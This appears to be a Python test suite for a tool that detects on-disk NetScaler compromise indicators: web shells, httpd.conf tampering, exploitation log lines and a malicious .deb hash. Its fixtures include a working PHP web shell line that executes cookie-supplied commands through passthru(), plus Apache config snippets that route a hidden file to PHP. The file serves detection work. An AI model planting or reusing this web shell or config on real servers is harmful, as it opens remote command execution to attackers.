"""Coverage for CVE-2026-88771/88772 (Citrix NetScaler ADC/Gateway
unauthenticated RCE + DTLS memory overflow) disk-visible compromise
indicators -- Unit42, published 2026-09-30:
https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/

Every path/string/hash exercised here is quoted or hashed directly from
that report (cross-checked against two independent extractions of the
article before being hardcoded) -- see the module docstring in
app.ingest.netscaler.compromise_indicators for the full citation.
"""
from __future__ import annotations

import hashlib

from app.ingest.netscaler.compromise_indicators import (
    KNOWN_MALICIOUS_DEB_SHA256,
    check_deb_hash,
    parse_httpaccess_vpn_log_for_payloads,
    parse_httpd_conf_for_tampering,
    parse_ns_log_for_exploitation,
    scan_logonpoint_custom_file,
)
from app.ingest.netscaler.helpers import looks_like_netscaler_artifact


def test_looks_like_netscaler_artifact_matches_compromise_indicator_paths() -> None:
    assert looks_like_netscaler_artifact("var/netscaler/logon/LogonPoint/custom/.ctxs.receiver") == (
        "netscaler_compromise", "logonpoint_custom_file", "netscaler_webshell_scan_raw",
    )
    assert looks_like_netscaler_artifact("etc/httpd.conf")[1] == "httpd_conf"
    assert looks_like_netscaler_artifact("var/log/ns.log")[1] == "ns_log"
    assert looks_like_netscaler_artifact("var/log/ns.log.1")[1] == "ns_log"
    assert looks_like_netscaler_artifact("var/log/httpaccess-vpn.log")[1] == "httpaccess_vpn_log"
    assert looks_like_netscaler_artifact("vpn/scripts/linux/nsg64.deb")[1] == "vpn_linux_script_deb"
    # A .deb anywhere else, or a differently-shaped linux script dir, isn't this pattern.
    assert looks_like_netscaler_artifact("nsconfig/nsg64.deb") is None


class TestWebshellScan:
    def test_known_webshell_filename_flags_critical(self) -> None:
        results = scan_logonpoint_custom_file("<?php /* harmless-looking */ ?>", source_path="var/netscaler/logon/LogonPoint/custom/.ctxs.receiver")
        assert len(results) == 1
        assert results[0]["severity"] == "critical"
        assert "known CVE-2026-88771 web shell" in results[0]["reasons"][0]

    def test_known_passphrase_flags_critical_regardless_of_filename(self) -> None:
        content = '<?php if ($_COOKIE["k"] === "Rhfajaf1H992") { passthru($_COOKIE["NSC_TASS"]); } ?>'
        results = scan_logonpoint_custom_file(content, source_path="var/netscaler/logon/LogonPoint/custom/receiver.min.a1b2c3.css")
        assert len(results) == 1
        assert results[0]["severity"] == "critical"
        reasons_text = " ".join(results[0]["reasons"])
        assert "passphrase" in reasons_text
        assert "NSC_TASS" in reasons_text
        assert "passthru" in reasons_text

    def test_known_rc4_key_flags_critical(self) -> None:
        content = '$key = "7489a0f93c67fa5cdaeb4b921d90594d";'
        results = scan_logonpoint_custom_file(content, source_path="var/netscaler/logon/LogonPoint/custom/style.css")
        assert results[0]["severity"] == "critical"
        assert "RC4 key" in results[0]["reasons"][0]

    def test_benign_static_asset_is_not_flagged(self) -> None:
        results = scan_logonpoint_custom_file("body { color: #333; }", source_path="var/netscaler/logon/LogonPoint/custom/style.css")
        assert results == []

    def test_unexpected_script_extension_flags_medium(self) -> None:
        results = scan_logonpoint_custom_file("#!/bin/sh\necho hi\n", source_path="var/netscaler/logon/LogonPoint/custom/weird.sh")
        assert len(results) == 1
        assert results[0]["severity"] == "medium"


class TestHttpdConfTampering:
    def test_flags_files_block_referencing_logonpoint(self) -> None:
        content = '<Files ".ctxs.receiver">\n    SetHandler application/x-httpd-php\n</Files>\n'
        findings = parse_httpd_conf_for_tampering(content, source_path="etc/httpd.conf")
        assert any(f["severity"] == "critical" and "LogonPoint" in f["message"] for f in findings)

    def test_flags_alias_routing_through_logonpoint_custom(self) -> None:
        content = "Alias /logon/LogonPoint/custom/receiver.min.css /var/netscaler/logon/LogonPoint/custom/.ctxs.receiver\n"
        findings = parse_httpd_conf_for_tampering(content, source_path="etc/httpd.conf")
        assert any(f["finding_type"] == "httpd_conf_tampering" and f["severity"] == "critical" for f in findings)

    def test_flags_php_engine_enabled(self) -> None:
        content = "php_flag engine on\n"
        findings = parse_httpd_conf_for_tampering(content, source_path="etc/httpd.conf")
        assert any("PHP engine" in f["message"] for f in findings)

    def test_benign_httpd_conf_is_clean(self) -> None:
        content = "ServerRoot /usr/local/apache\nListen 80\n<Files \"index.html\">\n    Require all granted\n</Files>\n"
        assert parse_httpd_conf_for_tampering(content, source_path="etc/httpd.conf") == []


def test_parse_ns_log_flags_exploitation_pattern() -> None:
    content = (
        "Sep 29 2026 10:00:00 <local0.info> HOST-REDACTED pitboss: pitboss started normally\n"
        'Sep 29 2026 10:05:00 <local0.err> HOST-REDACTED pitboss PPE missed too many heartbeatsNSPPE;attacker-stage2-payload\n'
    )
    results = parse_ns_log_for_exploitation(content, source_path="var/log/ns.log")
    assert len(results) == 1
    assert results[0]["line_number"] == 2
    assert results[0]["severity"] == "critical"
    assert results[0]["finding_type"] == "cve_2026_88771_exploitation_attempt"


def test_parse_ns_log_clean_log_has_no_findings() -> None:
    content = "Sep 29 2026 10:00:00 <local0.info> HOST-REDACTED pitboss: pitboss started normally\n"
    assert parse_ns_log_for_exploitation(content, source_path="var/log/ns.log") == []


class TestHttpaccessVpnLog:
    def test_flags_base64_shaped_long_user_agent(self) -> None:
        payload = "QWxsIHlvdXIgYmFzZSBhcmUgYmVsb25nIHRvIHVzLiBUaGlzIGlzIGEgcGFkZGVkIGJhc2U2NCBzdHJpbmcgdG8gZXhjZWVkIHRoZSB0aHJlc2hvbGQgbGVuZ3RoIGZvciB0aGUgdGVzdCBjYXNlIGhlcmUgeWVzIHJlYWxseSBsb25nIG5vdyBwYWRkaW5nIG1vcmUgYW5kIG1vcmUgYW5kIG1vcmUgYW5kIG1vcmUgYW5kIG1vcmUgdGV4dCBoZXJlLg=="
        line = f'192.0.2.10 - - [29/Sep/2026:10:00:00 +0000] "GET /vpn/index.html HTTP/1.1" 200 1234 "-" "{payload}"'
        results = parse_httpaccess_vpn_log_for_payloads(line, source_path="var/log/httpaccess-vpn.log")
        assert len(results) == 1
        assert results[0]["severity"] == "critical"
        assert results[0]["finding_type"] == "cve_2026_88771_payload_in_user_agent"

    def test_normal_user_agent_is_not_flagged(self) -> None:
        line = '192.0.2.10 - - [29/Sep/2026:10:00:00 +0000] "GET /vpn/index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'
        assert parse_httpaccess_vpn_log_for_payloads(line, source_path="var/log/httpaccess-vpn.log") == []

    def test_long_but_non_base64_user_agent_is_not_flagged(self) -> None:
        ua = "Mozilla/5.0 " + ("not base64 shaped text with spaces and punctuation! " * 5)
        line = f'192.0.2.10 - - [29/Sep/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "{ua}"'
        assert parse_httpaccess_vpn_log_for_payloads(line, source_path="var/log/httpaccess-vpn.log") == []


class TestDebHashCheck:
    def test_known_malicious_hash_table_is_well_formed(self) -> None:
        # A real recovered sample's hash has no feasible preimage to build a
        # fixture from -- this just guards against the hash itself being
        # mistyped/truncated when it was hardcoded from the report.
        known_hash = next(iter(KNOWN_MALICIOUS_DEB_SHA256))
        assert len(known_hash) == 64
        assert all(char in "0123456789abcdef" for char in known_hash)
        assert KNOWN_MALICIOUS_DEB_SHA256[known_hash].startswith("nsg64.deb")

    def test_unknown_deb_is_not_flagged(self) -> None:
        data = b"a legitimate stock NetScaler Gateway Plug-in installer, not a dropper"
        assert check_deb_hash(data, source_path="vpn/scripts/linux/nsgclient18.deb") == []

    def test_matching_hash_is_flagged_critical(self) -> None:
        # Exercise the real match path end-to-end with a synthetic payload
        # whose hash we register ourselves, rather than needing the actual
        # malware sample -- confirms check_deb_hash's hashing/lookup logic
        # independent of whether the hardcoded real-world hash is exact.
        import app.ingest.netscaler.compromise_indicators as module

        synthetic_payload = b"synthetic-test-payload-not-real-malware"
        synthetic_hash = hashlib.sha256(synthetic_payload).hexdigest()
        original_table = dict(module.KNOWN_MALICIOUS_DEB_SHA256)
        module.KNOWN_MALICIOUS_DEB_SHA256[synthetic_hash] = "synthetic-test.deb (unit test fixture)"
        try:
            results = check_deb_hash(synthetic_payload, source_path="vpn/scripts/linux/nsg64.deb")
            assert len(results) == 1
            assert results[0]["severity"] == "critical"
            assert results[0]["sha256"] == synthetic_hash
        finally:
            module.KNOWN_MALICIOUS_DEB_SHA256.clear()
            module.KNOWN_MALICIOUS_DEB_SHA256.update(original_table)
